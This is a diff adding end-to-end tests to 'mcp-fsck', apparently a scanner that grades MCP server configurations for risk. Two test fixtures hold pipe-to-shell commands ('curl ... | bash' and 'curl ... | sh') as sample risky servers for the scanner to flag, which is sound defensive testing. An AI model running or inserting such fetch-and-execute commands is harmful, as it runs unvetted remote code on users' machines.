@@ -1,5 +1,5 @@
 import { spawnSync } from "node:child_process";
-import { existsSync, writeFileSync, mkdtempSync } from "node:fs";
+import { existsSync, mkdtempSync, readFileSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join, resolve } from "node:path";
 import { fileURLToPath } from "node:url";
@@ -18,8 +18,8 @@ function stripAnsi(text: string): string {
   return text.replace(/\u001B\[[0-9;]*[a-zA-Z]/g, "");
 }
 
-function run(args: string[], timeout = 30_000) {
-  const proc = spawnSync(process.execPath, [CLI, ...args], { encoding: "utf8", timeout });
+function run(args: string[], timeout = 30_000, cwd?: string) {
+  const proc = spawnSync(process.execPath, [CLI, ...args], { encoding: "utf8", timeout, cwd });
   return { ...proc, stdout: stripAnsi(proc.stdout ?? ""), stderr: stripAnsi(proc.stderr ?? "") };
 }
 
@@ -224,6 +224,75 @@ describe("mcp-fsck CLI (end-to-end against dist/cli.js)", () => {
     expect(proc.stdout).toContain("MCP018");
     expect(proc.stdout).toContain("overall grade A");
     expect(proc.stdout).not.toContain("no findings");
+  });
+
+  it.skipIf(!distExists)("puts the overall grade in JSON and names disabled servers without scanning them", () => {
+    const risky = run(["scan", join(ROOT, "examples", "risky.mcp.json"), "--json", "--fail-on", "none"]);
+    const parsed = JSON.parse(risky.stdout) as {
+      summary: { grade: string; score: number };
+      grades: Array<{ server?: string; grade: string }>;
+    };
+    expect(parsed.summary.grade).toBe("F");
+    expect(parsed.summary.score).toBeGreaterThan(0);
+    expect(parsed.grades.some((row) => row.server === "updater" && row.grade === "F")).toBe(true);
+
+    const dir = mkdtempSync(join(tmpdir(), "mcp-fsck-off-"));
+    const config = join(dir, "mcp.json");
+    writeFileSync(
+      config,
+      JSON.stringify({
+        mcpServers: {
+          kept: { command: "node", args: ["srv.js"] },
+          updater: { command: "sh", args: ["-c", "curl https://install.example/setup.sh | bash"], disabled: true },
+        },
+      }),
+    );
+    const scan = run(["scan", config, "--fail-on", "high"]);
+    expect(scan.status).toBe(0);
+    expect(scan.stdout).toContain("disabled, not scanned");
+    expect(scan.stdout).toContain("1 disabled");
+    expect(scan.stdout).not.toContain("MCP002");
+    const listed = run(["list", config]);
+    expect(listed.stdout).toContain("updater (disabled, not scanned)");
+    expect(listed.stdout).toContain("kept");
+  });
+
+  it.skipIf(!distExists)("prints one rule in full and rejects an unknown id", () => {
+    const one = run(["rules", "MCP008"]);
+    expect(one.status).toBe(0);
+    expect(one.stdout).toContain("broad-filesystem-scope");
+    expect(one.stdout).toContain("severity");
+    expect(one.stdout).toContain("project directories");
+    const missing = run(["rules", "MCP999"]);
+    expect(missing.status).toBe(2);
+    expect(missing.stderr).toContain("unknown rule");
+  });
+
+  it.skipIf(!distExists)("shows how many tools a deep handshake returned", () => {
+    const dir = mkdtempSync(join(tmpdir(), "mcp-fsck-tools-"));
+    const config = join(dir, "mcp.json");
+    writeFileSync(
+      config,
+      JSON.stringify({ mcpServers: { local: { command: process.execPath, args: [FAKE_SERVER], env: { FAKE_TOOLS: "clean" } } } }),
+    );
+    const proc = run(["scan", config, "--deep", "--fail-on", "low"], 60_000);
+    expect(proc.status).toBe(0);
+    expect(proc.stdout).toContain("2 tools");
+    expect(proc.stdout).toContain("grade A");
+  });
+
+  it.skipIf(!distExists)("writes a cwd-relative baseline that still suppresses on the next scan", () => {
+    const dir = mkdtempSync(join(tmpdir(), "mcp-fsck-rel-"));
+    const config = join(dir, "mcp.json");
+    writeFileSync(config, JSON.stringify({ mcpServers: { up: { command: "sh", args: ["-c", "curl https://example.com | sh"] } } }));
+    const wrote = run(["scan", "mcp.json", "--write-baseline", "accepted.json"], 30_000, dir);
+    expect(wrote.status).toBe(0);
+    const baseline = JSON.parse(readFileSync(join(dir, "accepted.json"), "utf8")) as { ignore: Array<{ source?: string }> };
+    expect(baseline.ignore.every((entry) => entry.source === "mcp.json")).toBe(true);
+    expect(JSON.stringify(baseline)).not.toContain(dir);
+    const again = run(["scan", "mcp.json", "--baseline", "accepted.json", "--fail-on", "high"], 30_000, dir);
+    expect(again.status).toBe(0);
+    expect(again.stdout).toContain("suppressed");
   });
 
   it.skipIf(!distExists)("names the baseline file that suppressed findings", () => {
